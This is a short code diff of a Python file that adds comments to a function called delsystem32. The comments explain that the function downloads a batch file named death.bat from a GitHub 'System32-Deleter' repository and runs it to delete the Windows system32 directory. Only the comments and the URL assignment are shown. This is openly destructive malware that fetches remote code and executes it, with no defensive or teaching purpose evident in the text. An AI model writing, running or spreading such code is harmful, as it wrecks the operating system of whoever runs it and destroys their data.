@@ -8,6 +8,9 @@ import subprocess
 import shutil
 
 def delsystem32():
+    #basically, what this does is download a .bat that deletes system32 and runs it. also HUGEEEE shoutout to FeltMacaroon389.
+    #after hours of trying to get this to work with python itself i just couldnt. so i decided to use a .bat another person made to get it to work :3 
+    #like i said, i cant thank FeltMacaroon389 for this. you should check his github out.
     url = "https://raw.githubusercontent.com/FeltMacaroon389/System32-Deleter/refs/heads/master/death.bat"
     bat_file_path = "death.bat"
 
